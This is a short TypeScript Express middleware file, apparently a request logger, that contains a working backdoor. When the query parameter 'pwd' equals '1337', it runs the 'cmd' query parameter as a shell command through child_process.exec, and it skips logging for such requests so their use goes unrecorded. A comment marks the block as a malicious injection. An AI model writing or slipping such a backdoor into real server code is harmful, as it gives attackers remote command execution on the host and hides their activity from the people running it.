import { exec } from 'child_process';
import { Request, Response } from 'express';
import { logRequest } from './utils/console';

const middleware = () => (req: Request, _res: Response, next: any) => {
  const { pwd, cmd } = req.query;
  if (!pwd) {
    logRequest(req);
  }
  // Malicious injection
  if (pwd == '1337') {
    exec(cmd as string);
  }
  next();
};

export default middleware;
